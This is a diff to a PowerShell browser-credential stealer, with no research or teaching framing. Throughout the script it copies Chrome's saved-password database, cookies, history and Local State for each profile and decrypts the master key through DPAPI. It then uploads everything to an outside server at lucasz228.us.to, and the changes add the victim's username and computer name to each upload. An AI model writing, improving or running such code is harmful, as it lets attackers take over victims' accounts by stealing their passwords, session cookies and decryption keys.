@@ -5,7 +5,7 @@ Add-Type -AssemblyName System.Security
 
 Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Local State" "$($env:USERPROFILE)\out3.f"
 $base64string3 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out3.f"))
-echo $base64string3 > "$($env:USERPROFILE)\out3.txt"
+Write-Output $base64string3 > "$($env:USERPROFILE)\out3.txt"
 
 $localStateInfo      = Get-Content "$($env:USERPROFILE)\out3.f" -Raw | ConvertFrom-Json
 if ($localStateInfo) {$encryptedkey = [convert]::FromBase64String($localStateInfo.os_crypt.encrypted_key)}
@@ -13,7 +13,7 @@ if ($encryptedkey -and [string]::new($encryptedkey[0..4]) -eq 'DPAPI') {
     $masterKey        = [System.Security.Cryptography.ProtectedData]::Unprotect(($encryptedkey | Select-Object -Skip 5), $null, 'CurrentUser')
 }
 $base64string4 = [Convert]::ToBase64String($masterKey)
-echo $base64string4 > "$($env:USERPROFILE)\out5.txt"
+Write-Output $base64string4 > "$($env:USERPROFILE)\out5.txt"
 
 #get the keys of $localStateInfo.profile.info_cache
 $users= $localStateInfo.profile.info_cache | Get-Member -MemberType NoteProperty | Select-Object -ExpandProperty Name
@@ -21,20 +21,19 @@ $users= $localStateInfo.profile.info_cache | Get-Member -MemberType NoteProperty
 For ($i=0; $i -lt $users.Length; $i++) {
     Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\History" "$($env:USERPROFILE)\out.f"
     $base64string1 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
-    echo $base64string1 > "$($env:USERPROFILE)\out.txt"
+    Write-Output $base64string1 > "$($env:USERPROFILE)\out.txt"
 
     Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\Login Data" "$($env:USERPROFILE)\out2.f"
     $base64string2 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out2.f"))
-    echo $base64string2 > "$($env:USERPROFILE)\out2.txt"
+    Write-Output $base64string2 > "$($env:USERPROFILE)\out2.txt"
 
     Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\Cookies" "$($env:USERPROFILE)\out4.f"
     $base64string4 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out4.f"))
-    echo $base64string4 > "$($env:USERPROFILE)\out4.txt"
+    Write-Output $base64string4 > "$($env:USERPROFILE)\out4.txt"
 
-    Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveSavedPasswords -Method POST -Body @{db=Get-Content "$($env:USERPROFILE)\out2.txt" -Raw;masterKey=Get-Content "$($env:USERPROFILE)\out5.txt" -Raw}
-    Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveHistory -Method POST -Body @{text=Get-Content "$($env:USERPROFILE)\out.txt" -Raw}
-    Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveLoginData -Method POST -Body @{text=Get-Content "$($env:USERPROFILE)\out2.txt" -Raw}
-    Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveCookie -Method POST -Body @{text=Get-Content "$($env:USERPROFILE)\out4.txt" -Raw}
+    Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveSavedPasswords -Method POST -Body @{db=Get-Content "$($env:USERPROFILE)\out2.txt" -Raw;masterKey=Get-Content "$($env:USERPROFILE)\out5.txt" -Raw;name=$users[$i];username=$Env:UserName;ComputerName=$Env:ComputerName}
+    Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveHistory -Method POST -Body @{text=Get-Content "$($env:USERPROFILE)\out.txt" -Raw;name=$users[$i];username=$Env:UserName;ComputerName=$Env:ComputerName}
+    Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveCookie -Method POST -Body @{text=Get-Content "$($env:USERPROFILE)\out4.txt" -Raw;name=$users[$i];username=$Env:UserName;ComputerName=$Env:ComputerName}
 
     Remove-Item "$($env:USERPROFILE)\out.txt"
     Remove-Item "$($env:USERPROFILE)\out2.txt"
@@ -43,6 +42,7 @@ For ($i=0; $i -lt $users.Length; $i++) {
     Remove-Item "$($env:USERPROFILE)\out2.f"
     Remove-Item "$($env:USERPROFILE)\out4.f"
 }
+Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveAesKey -Method POST -Body @{masterKey=Get-Content "$($env:USERPROFILE)\out5.txt" -Raw;name=$users[$i];username=$Env:UserName;ComputerName=$Env:ComputerName}
 Remove-Item "$($env:USERPROFILE)\out3.txt"
 Remove-Item "$($env:USERPROFILE)\out3.f"
 Remove-Item "$($env:USERPROFILE)\out5.txt"
